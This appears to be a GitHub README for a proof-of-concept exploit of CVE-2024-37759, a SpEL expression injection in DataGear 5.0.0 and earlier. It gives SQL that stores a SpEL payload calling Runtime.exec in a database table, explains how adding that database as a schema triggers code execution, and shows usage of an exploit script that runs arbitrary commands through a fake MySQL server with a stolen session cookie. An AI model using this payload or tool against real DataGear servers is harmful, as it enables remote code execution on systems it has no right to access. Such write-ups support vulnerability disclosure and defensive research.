# CVE-2024-37759 PoC

## Description

DataGear version 5.0.0 and earlier has a SpEL expression injection vulnerability that leads to remote code execution.

## Exploit

### CVE Exploit Details

When you request the `/data/{schemaId}/{tableName}/view` interface, if the database table does not have a primary key, an attacker can inject a malicious SpEL expression into the `data` field. When the "view" button is clicked, the SpEL expression will be executed.

To execute the attack, You can create a malicious database table like this:

```SQL
CREATE DATABASE evil;

CREATE TABLE `evil` (
  `name` varchar(209) COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `evil` VALUES ("#{T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('calc')}");
```

Then, log in and add this MySQL database in the schema add interface: `/schema/saveAdd`.
Click the "view" button afterward, and the SpEL expression will be executed.

### Exploit Usage

This exploit is modified from [MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server). First, log in to the portal and obtain the cookie "JSESSIONID". You can then use this exploit to execute commands automatically.

The `-t` argument specifies the target vulnerable site, `-o` specifies the public IP address where the MySQL fake server is accessible, `-p` is for the fake server port, `-s` is for the cookie value of "JSESSIONID", and `-c` specifies the command you want to execute.

```shell
python3.7 exp.py -t "http://localhost:50401" -o "192.168.25.130" -p "3306" -s "B751A41FBE8C3385B386B2365C2FB86D" -c "calc"
```
